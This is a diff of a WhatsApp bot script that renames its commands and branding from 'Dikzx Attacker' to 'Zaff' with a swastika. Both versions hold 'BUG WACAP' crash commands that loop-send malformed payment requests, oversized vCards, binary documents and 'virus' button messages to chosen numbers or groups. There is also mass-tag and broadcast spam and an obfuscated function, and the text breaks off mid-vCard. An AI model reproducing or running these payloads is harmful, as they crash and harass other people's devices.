-"footerText": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,
+"footerText": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,
 "productImageCount": 1,
 "firstImageId": 1,
-"retailerId": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ WE ARE NOT MASTOD`,
+"retailerId": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ WE ARE NOT MASTOD`,
 "url": "wa.me/6285714170944"
 },
 "businessOwnerJid": "6285714170944@s.whatsapp.net",
@@ -1297,14 +1297,14 @@ m.reply(tekteka)
 }
 break
 //=================================================//
-case 'dikzxjagoan' : {
+case 'zaffjagoan' : {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
-haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 mimetype: 'audio/mpeg', caption: `${buttonkal}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -1316,7 +1316,7 @@ thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg',
 break
 //=================================================//
 /*BUG WACAP */
-case 'dikzxskuy' : {
+case 'zaffskuy' : {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
@@ -1341,7 +1341,7 @@ await sleep(20)
 break
 //=================================================//
 /*BUG WACAP */
-case 'gasdikzx' : {
+case 'gaszaff' : {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
@@ -1380,39 +1380,39 @@ function _0x128b(_0x4b9866,_0x371baa){var _0x50e42b=_0x50e4();return _0x128b=fun
 }
 }
 break
-case '🌷': case 'crashmek': case 'ampunsuhu': case 'ahyangbetul': case 'okemek': case 'dikzxnih': case 'crashar18': case 'mekdemam': case 'dikzx1': case 'dikzx2': case 'dikzx3': case 'dikzx4': case 'dikzx5': case 'dikzx6': case 'dikzx7': case 'dikzx8': case 'dikzx9': case 'dikzx10': case 'dikzx11': case 'dikzx12': case 'dikzx13': case 'dikzx14': case 'dikzx15': case 'dikzx16': case 'dikzx17': case 'dikzx18': case 'dikzx19': case 'dikzx20': case 'dikzx21': case 'dikzx22': case 'dikzx23': case 'dikzx24': case 'dikzx25': case 'dikzx26': case 'dikzx27': case 'dikzx28':
-case 'dikzx29':
-case 'dikzx30':
-case 'dikzx31':
-case 'dikzx32':
-case 'dikzx33':
-case 'dikzx34':
-case 'dikzx35':
-case 'dikzx36':
-case 'dikzx37':
-case 'dikzx38':
-case 'dikzx39':
-case 'dikzx40':
-case 'dikzx41':
-case 'dikzx42':
-case 'dikzx43':
-case 'dikzx44':
-case 'dikzx45':
-case 'dikzx46':
-case 'dikzx47':
-case 'dikzx48':
-case 'dikzx49':
-case 'dikzx50':
-case 'dikzx51':
-case 'dikzx52':
-case 'dikzx53':
-case 'dikzx54':
-case 'dikzx55':
-case 'dikzx56':
-case 'dikzx57':
-case 'dikzx58':
-case 'dikzx59':
-case 'dikzx60':
+case '🌷': case 'crashmek': case 'ampunsuhu': case 'ahyangbetul': case 'okemek': case 'zaffnih': case 'crashar18': case 'mekdemam': case 'zaff1': case 'zaff2': case 'zaff3': case 'zaff4': case 'zaff5': case 'zaff6': case 'zaff7': case 'zaff8': case 'zaff9': case 'zaff10': case 'zaff11': case 'zaff12': case 'zaff13': case 'zaff14': case 'zaff15': case 'zaff16': case 'zaff17': case 'zaff18': case 'zaff19': case 'zaff20': case 'zaff21': case 'zaff22': case 'zaff23': case 'zaff24': case 'zaff25': case 'zaff26': case 'zaff27': case 'zaff28':
+case 'zaff29':
+case 'zaff30':
+case 'zaff31':
+case 'zaff32':
+case 'zaff33':
+case 'zaff34':
+case 'zaff35':
+case 'zaff36':
+case 'zaff37':
+case 'zaff38':
+case 'zaff39':
+case 'zaff40':
+case 'zaff41':
+case 'zaff42':
+case 'zaff43':
+case 'zaff44':
+case 'zaff45':
+case 'zaff46':
+case 'zaff47':
+case 'zaff48':
+case 'zaff49':
+case 'zaff50':
+case 'zaff51':
+case 'zaff52':
+case 'zaff53':
+case 'zaff54':
+case 'zaff55':
+case 'zaff56':
+case 'zaff57':
+case 'zaff58':
+case 'zaff59':
+case 'zaff60':
 case '🦂':
 case '🐍':
 case '🍓':
@@ -1470,7 +1470,7 @@ m.reply(`${m.pushName} Hello Saya Bot Hw Mods${text ? ': ' + text : ''}`)
 }
 break
 //=================================================//
-case 'dikzxstik': case 'dikzxkangbug': case 'buttonkematian': case 'crashar19': {
+case 'zaffstik': case 'zaffkangbug': case 'buttonkematian': case 'crashar19': {
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1513,7 +1513,7 @@ m.reply(mess.wait)
 haikal.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${bugsw}` }, { quoted:m })
 break
 //=================================================//
-case 'dikzxbugie': case 'dikzxkangbug1': case 'crashar20': {
+case 'zaffbugie': case 'zaffkangbug1': case 'crashar20': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1533,7 +1533,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
+"fileName": `© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
 }
 }
@@ -1548,7 +1548,7 @@ if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`
 let anu = await store.chats.all().map(v => v.id)
-let doc ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./baseikal/image/pict.jpg'), surface: 200, message: `ZIM-BOT-INC`, orderTitle: '© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
+let doc ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./baseikal/image/pict.jpg'), surface: 200, message: `ZIM-BOT-INC`, orderTitle: '© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
 m.reply(`*Send Broadcast To* ${anu.length} *Group Chat, Time ${anu.length * 1.5} minutes*`)
 for (let i of anu) {
 await sleep(1500)
@@ -1588,7 +1588,7 @@ break
 case 'bugbctext': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!text) throw `*Type some text*\n\nExample : ${prefix + command} dikzxmods`
+if (!text) throw `*Type some text*\n\nExample : ${prefix + command} zaffmods`
 let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${haikal.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
 let anu = await store.chats.all().map(v => v.id)
 m.reply(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
@@ -1600,7 +1600,7 @@ m.reply('*Success Broadcast*')
 }
 break
 //=================================================//
-case 'dikzxbutton': case 'dikzxkangbuttton': case 'testbutton': case 'inibutton': 
+case 'zaffbutton': case 'zaffkangbuttton': case 'testbutton': case 'inibutton': 
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1613,7 +1613,7 @@ const buttons = [
 {buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
 ]
 const buttonMessage = {
-text: "© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢",
+text: "© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢",
 footerText: 'Pe',
 buttons: buttons,
 headerType: 1
@@ -1622,7 +1622,7 @@ haikal.sendMessage(m.chat, buttonMessage)
 }
  break
 //=================================================//
-case 'dikzxtag': case 'dikzxbar':  {
+case 'zafftag': case 'zaffbar':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
@@ -1630,7 +1630,7 @@ haikal.sendMessage(m.chat, { text : `${buttonkal}` , mentions: participants.map(
 }
 break
 //=================================================//
-case 'hiya': case 'dikzxoke': {
+case 'hiya': case 'zaffoke': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1638,19 +1638,19 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
 anuin = fs.readFileSync('./baseikal/sound/ngeselin.BIN')
-haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ${ngazap(prefix)}.BIN`, title: `© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ${ngazap(prefix)}.BIN` }, { quoted: doc })
+haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ${ngazap(prefix)}.BIN`, title: `© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ${ngazap(prefix)}.BIN` }, { quoted: doc })
 }
 }
 break
 //=================================================//
-case 'dikzxtod': case 'dikzxewe': {
+case 'zafftod': case 'zaffewe': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
- const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
+ const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 